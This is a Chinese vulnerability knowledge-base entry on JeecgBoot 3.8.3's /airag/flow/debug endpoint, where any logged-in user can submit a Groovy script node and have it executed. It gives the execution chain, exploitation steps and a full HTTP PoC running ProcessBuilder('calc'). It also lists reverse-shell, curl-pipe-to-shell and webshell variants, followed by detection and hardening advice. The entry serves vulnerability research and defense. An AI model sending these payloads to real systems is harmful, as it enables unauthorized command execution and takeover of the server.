---
id: web-java-framework-jeecgboot-airag-flow-debug-groovy-rce
title: JeecgBoot 3.8.3 /airag/flow/debug：任意用户提交 Groovy 脚本节点导致命令执行
type: scenario
domain: web
path: web/java/framework
technique: jeecgboot-airag-flow-debug-groovy-rce
tags:
- java
- jeecgboot
- airag
- liteflow
- groovy
- rce
- authz
- script-engine
cve: []
severity: critical
confidence: high
status: verified
affected_versions: JeecgBoot 3.8.3（原文环境）；3.9.1 增加 airag:flow:debug 权限修复
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V37
  verified_at: '2026-11-05T06:01:09+08:00'
  notes: 已对照原文及31张截图核对：/jeecgboot/airag/flow/debug 入口、debugFlow→FlowExecutor.execute2Future→LiteFlow→ScriptCommonComponent→JSR223ScriptExecutor→GroovyScriptEngineImpl.eval→scriptObject.run 调用链、codeType=groovy payload、测试用户（非管理员）携带 x-access-token 弹计算器、其余三种脚本类型未打通、3.9.1 commit 新增 airag:flow:debug 权限，均一致。简化 PoC 为按原文推导的等价最小结构，未在本机复跑。
url: /docs/web/java/framework/web-java-framework-jeecgboot-airag-flow-debug-groovy-rce/
draft: false
kb_aliases:
- JeecgBoot debug RCE
- airag flow debug 命令执行
- LiteFlow ScriptCommonComponent RCE
- GroovyScriptEngineImpl 命令执行
- JeecgBoot AI 流程调试漏洞
- codeType groovy 注入
---

## 一句话结论

JeecgBoot 3.8.3 的 `POST /jeecgboot/airag/flow/debug` 允许任意登录用户提交 AI 流程设计 JSON，其中 `code` 节点的 `codeType` 可选 `groovy`、`code` 为任意 Groovy 源码；`debugFlow` 用 LiteFlow 执行该流程，最终走到 `GroovyScriptEngineImpl.eval()` 的 `scriptObject.run()`，直接执行 `new ProcessBuilder("calc").start()` 等系统命令。

## 原理

- **入口**：`airag` 流程控制器的 `@PostMapping("/debug")` 接收 `@RequestBody FlowDebugParams`，调用 `airagFlowService.debugFlow(flowDebugParams)`；`debugFlow` 给流程设置临时 id、applicationName、status，解析 `flow.getDesign()` 中的 `nodes`，构造 LiteFlow chain 并调用 `FlowExecutor.execute2Future(...)`。
- **执行链**：`FlowExecutor` → `Chain.execute` → `Condition.execute` → `ThenCondition.executeCondition` → `Node.execute` → `DefaultNodeExecutor.execute` → `NodeComponent.execute` → `ScriptCommonComponent.process` → `ScriptExecutor.execute` → `JSR223ScriptExecutor.executeScript` → `CompiledScript.eval` → `GroovyCompiledScript.eval` → `GroovyScriptEngineImpl.eval` → `scriptObject.run()`。
- **脚本引擎选择**：流程节点的 `properties.codeType` 决定脚本引擎；设计器可选 JavaScript、Groovy、Kotlin、Aviator。原文测试另外三种语法无法执行命令，Groovy 可直接调用 Java API。
- **无沙箱**：`JSR223ScriptExecutor` 使用 `SimpleBindings` 绑定参数后直接 `compiledScript.eval(bindings)`，没有类/方法白名单、没有 SecurityManager、也没有表达式沙箱；Groovy 脚本可 `new ProcessBuilder(...)`、`Runtime.getRuntime()`、读写文件等。
- **权限缺陷**：3.8.3 的 `/debug` 接口只要求登录，不校验 `airag:flow:debug` 权限；任意用户（包括普通测试用户）都能提交并调试流程，从而执行任意 Groovy。
- **修复**：3.9.1 在 `sys_permission` 增加 `airag:flow:debug` 权限并绑定到管理员角色，接口增加鉴权，只有管理员可调用；这属于权限收口，脚本引擎本身仍未沙箱化。

## 触发条件

- JeecgBoot 3.8.3（或未包含 3.9.1 权限修复的版本）。
- 攻击者持有任意有效登录态（`X-Access-Token` / `x-access-token`）。
- 目标启用 AI 流程（airag）功能，`/jeecgboot/airag/flow/debug` 可达。
- 请求体可提交完整 `FlowDebugParams`，其中 `design` 含 `code` 节点且 `codeType=groovy`。
- 目标 classpath 含 Groovy（LiteFlow 的 JSR223 执行器需要对应引擎）。

## 利用步骤

1. 登录任意账号，取得 `X-Access-Token`（或 Cookie）。
2. 构造 `FlowDebugParams`，`flow.design` 为 JSON 字符串，包含 start、code、end 节点；code 节点的 `properties` 写 `{"codeType":"groovy","code":"new ProcessBuilder(\"calc\").start()"}`。
3. 发送 `POST /jeecgboot/airag/flow/debug`，`Content-Type: application/json`，携带 token。
4. 服务端执行流程，Groovy 脚本在 `scriptObject.run()` 中执行命令；原文在测试机弹出计算器验证。
5. 将命令替换为反弹 Shell、下载执行、读写文件等；也可使用 `def main(params) { ... }` 形式接收流程参数。
6. 若接口返回 SSE，观察事件流中是否出现执行成功/异常；命令执行通常在返回前已发生。

## PoC

请求：

```http
POST /jeecgboot/airag/flow/debug HTTP/1.1
Host: target:3100
Content-Type: application/json
x-access-token: <任意用户 token>

{"flow":{"design":"{\"nodes\":[{\"id\":\"start-node\",\"type\":\"start\",\"properties\":{}},{\"id\":\"code_1\",\"type\":\"code\",\"properties\":{\"codeType\":\"groovy\",\"code\":\"new ProcessBuilder(\\\"calc\\\").start()\"}},{\"id\":\"end-node\",\"type\":\"end\",\"properties\":{}}]}"}}
```

原文完整 payload 中的 code 节点：

```json
{"id":"code_...","type":"code","properties":{"text":"脚本执行","codeType":"groovy","code":"def main(params) {\n new ProcessBuilder(\"calc\").start()\n return [\n result: \"${params.arg1}拼接${params.arg2}\"\n ]\n}"}}
```

两条 payload 都能执行命令；`def main(params)` 形式由 LiteFlow 传入流程变量，`new ProcessBuilder("calc").start()` 是更小的验证形式。

## 变体与关联

- 变体：命令换成 `/bin/bash -c 'bash -i >& /dev/tcp/... 0>&1'`、`curl ... | sh`、写 JSP/内存马等。
- 变体：其他 `codeType`（JavaScript/Kotlin/Aviator）在原文测试中无法直接执行命令，但若引擎实现有副作用仍可能被滥用；Groovy 是最直接的。
- 变体：`design` 中的其他节点/表达式若进入脚本引擎或 SpEL/OGNL 求值，也可能形成同类 sink。
- 关联：[[web-java-framework-jeecgboot-api-dict-waf-regex-sqli]]（同产品另一条注入链，但本条是脚本引擎 RCE）。
- 关联：[[ai-security-mcp-stdio-endpoint-command-injection]]（同属 AI 功能面把用户输入交给命令执行）。
- 边界：升级到 3.9.1+ 并正确配置 `airag:flow:debug` 权限后，普通用户无法调用；管理员仍可执行任意 Groovy，属于设计上的高权限功能。

## 检测与防御

- **日志检测**：`/airag/flow/debug` 请求体出现 `codeType":"groovy"`、`ProcessBuilder`、`Runtime.getRuntime`、`/bin/bash`、`curl` 等；普通账号调用 debug 接口；SSE 响应异常短或包含脚本异常堆栈。
- **主机检测**：JeecgBoot 进程（Java）拉起 `sh -c`、`calc`、`bash`、`curl` 等子进程；应用服务器出现异常网络外连。
- **修复**：升级到 3.9.1+，为 `airag:flow:debug` 配置管理员专属权限；接口层增加角色校验，不仅依赖登录态。
- **加固**：脚本节点使用白名单语言/沙箱（如 GraalVM 隔离、禁用 `ProcessBuilder`/`Runtime`/反射/文件 IO）；限制 AI 流程设计权限；对流程设计 JSON 做结构校验，禁止任意代码字段；把调试功能放到独立低权限/隔离服务。
